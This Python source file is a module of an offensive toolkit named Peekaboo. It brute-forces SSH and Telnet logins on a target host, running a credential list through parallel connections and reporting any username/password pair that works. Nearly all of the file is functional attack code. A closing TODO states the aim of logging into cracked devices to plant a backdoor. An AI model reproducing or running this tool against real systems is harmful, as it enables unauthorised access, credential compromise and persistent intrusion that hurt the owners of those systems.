# ssh_telnet_bruteforce.py
# 
# This is a Peekaboo Module for bruteforcing default configuration SSH and Telnet Servers
# 
# By default OpenSSH has no Authentication Attempt limit, this allows SSH Brute force attacks to be performed
# ! OpenSSH by default limits max parallel connections to 10 at a time !
#
# Telnet being the ancient protocol it is, also has not Authentication Attempt limit
# ! Telnet is inherenty insecure, creds are not encrypted over the created TCP Connection !
# ! Due Telnets unclean terminal, false postives can happen !
# 
# This module will ask for the following inputs:
# Protocol Type - Asks for which Protocol to Attack (Telnet/SSH)
# Creds File - Lists of Username/Passwords delimited by Spaces and Newlines
# ! Creds Files need to be placed in the lists dir for Peekaboo to use them !
#
# Editable Consts:
# connection_amt - The amount of parallel connections the module will try to make, by default it is 5 parallel connections
#
# Written by Evan and Richard


# pssh - Parallel SSH Lib
from pssh.clients.ssh import ParallelSSHClient
from pssh.config import HostConfig
from pssh.exceptions import *

import os
import time
import telnetlib
import threading
import datetime
import sys

# load utils.py file for commonly used functions and consts
sys.path.append('../')
from utils import WORKING_DIR, MODULES_DIR, LISTS_DIR, bcolors, detect_backdoor

# TelentConnection Class for threading connections 
class TelnetConnection(threading.Thread):
    def __init__(self, ip_addr, username, password):

        super(TelnetConnection, self).__init__()

        self.ip_addr = ip_addr
        self.username = username
        self.password = password
        self.successful = False

    def run(self):

        try:
            tn = telnetlib.Telnet(self.ip_addr)
            tn.read_until(b'login: ')
            tn.write(self.username.encode('ascii') + b'\n')
            tn.read_until(b'Password: ')
            tn.write(self.password.encode('ascii') + b'\n')
            shell = tn.expect([b'#'], timeout=5)
            self.successful = shell[1] != None
            tn.close()        
        # False postives due to exception, need to investigate
        except EOFError:
            self.successful = False
            
class SSH_TELNET_BRUTEFORCE:

    # MODULE name for module loader 
    def name(self):
        return 'SSH_TELNET_BRUTEFORCE'

    def selected(self, localhost, target):
        self.localhost = localhost
        self.target = target

        # EDIT FOR MORE PARALLEL CONNECTIONS, SSH MAX IS 10
        self.connection_amt = 5

        self.current_connection_amt = 0

        self.TELNET_connections = []

        self.proto_type = None

        # Ask for Protocol to bruteforce
        while self.proto_type == None:
            out = input('SSH or Telent? (s/t): ')
            if out == 'ssh' or out == 's' or out == '':
                self.proto_type = 'SSH'
            elif out == 'telnet' or out == 't':
                self.proto_type = 'TELNET'
            else:
                print('[!] Invalid Input. Select SSH or Telnet.') 
        
        self.cred_file = None
        
        # Ask for Credfile to use for bruteforce
        while self.cred_file == None:
            out = input('Enter Credentials File: ')
            filepath = os.path.join(LISTS_DIR, out)
            if os.path.exists(filepath):
                self.cred_file = filepath   
            else:
                print('[!] Invalid Filepath.')

        self.parse()

    # parses credfile into 2D arr [[username, password], ...]
    def parse(self):
        self.creds = [] 

        with open(self.cred_file, 'r') as f:
            data = f.readlines()

        for line in data:
            cred = line.strip().split()
            if len(cred) == 2:
                self.creds.append(cred)
        
        self.creds_size = len(self.creds)
        
    # Using parallel SSH lib to start set amount of threaded connections
    # return output for exit code
    def attempt_SSH_connections(self, host, host_config):

        hosts = []
        for i in range(len(host_config)):
            hosts.append(host)

        conn = ParallelSSHClient(hosts, host_config=host_config)
        out = conn.run_command('exit', stop_on_errors=False)
        conn.join(out)

        return out
        
    # create TelnetConnection Objs and start the acompanying threads
    def create_TELNET_connection(self, ip_addr, username, password):
        conn = TelnetConnection(ip_addr, username, password)
        conn.start()

        self.TELNET_connections.append(conn)
        self.current_connection_amt += 1

    # polls all TelnetConnection Objs to determine if connection attempted
    # If connections attempted, check for success/fail
    # Remove Connections once all attempted
    def poll_TELNET_connections(self):
        for conn in self.TELNET_connections:
            conn.join()
            
            if conn.successful:
                print(f'\n[!] {bcolors.OKGREEN}Username/Password Combo found!{bcolors.ENDC}')
                print(f'[!] Username: {conn.username} Password: {conn.password}')
                return True
        
        self.TELNET_connections = []
        self.current_connection_amt = 0

        return False   

    def run(self):

        if self.proto_type == 'SSH':

            print(f'[!] {bcolors.HEADER}SSH Brute Force Started{bcolors.ENDC}')
            print(f'[*] Using Credential File: {self.cred_file}')
            print(f'[*] Contains {self.creds_size} Username/Password Combos')
            print(f'[*] Using {self.connection_amt} Threads for Connections')
    
            start_time = datetime.datetime.now()

            host_configs = []
            for idx, cred in enumerate(self.creds):

                host_configs.append(HostConfig(user=cred[0], password=cred[1]))    

                # Wait for five connections to be created or if less then five, check exit code of attempts
                if (idx+1) % self.connection_amt == 0 or self.creds_size - idx + 1 < self.connection_amt:

                    end_time = datetime.datetime.now()
                    print(f'\r[*] Attempted {idx+1} Username/Password Combos\n[*] Time Elapsed: {end_time-start_time}\033[F', end='')

                    host_outs = self.attempt_SSH_connections(self.target.ip_addr, host_configs)         
                    
                    for i in range(0, len(host_outs)):
                        host_out = host_outs[i]
                        host_config = host_configs[i]                   
                        conn_fail = host_out.exception
                    
                        if conn_fail == None:
                            print(f'\n[!] {bcolors.OKGREEN}Username/Password Combo found!{bcolors.ENDC}')
                            print(f'[!] Username: {host_config.user} Password: {host_config.password}')
                            return
 
                    host_configs = []
                
            print(f'\n[!] {bcolors.FAIL}No Username/Password Combo found!{bcolors.ENDC}')

        elif self.proto_type == 'TELNET':

            print(f'[!] {bcolors.HEADER}TELNET Brute Force Started{bcolors.ENDC}')            
            print(f'[*] Using Credential File:: {self.cred_file}')
            print(f'[*] Contains {self.creds_size} Username/Passwoord Combos')
            print(f'[*] Using {self.connection_amt} Threads for Connections')
    
            start_time = datetime.datetime.now()

            combo_found = False
            for idx, cred in enumerate(self.creds):
                self.create_TELNET_connection(self.target.ip_addr, cred[0], cred[1])
                if self.current_connection_amt == self.connection_amt or self.creds_size - idx + 1 < self.connection_amt:
                    end_time = datetime.datetime.now()
                    print(f'\r[*] Attempted {idx+1} Username/Password Combos\n[*] Time Elapsed: {end_time-start_time}\033[F', end='')
                    # polls connections until successful creds combo has been found
                    if self.poll_TELNET_connections():
                        combo_found = True
                        break
        
            if not combo_found:
                print(f'\n[!] {bcolors.FAIL}No Username/Password Combo found!{bcolors.ENDC}')
            

        # TODO
        # If creds have been found, login into device and dump backdoor on device
                   


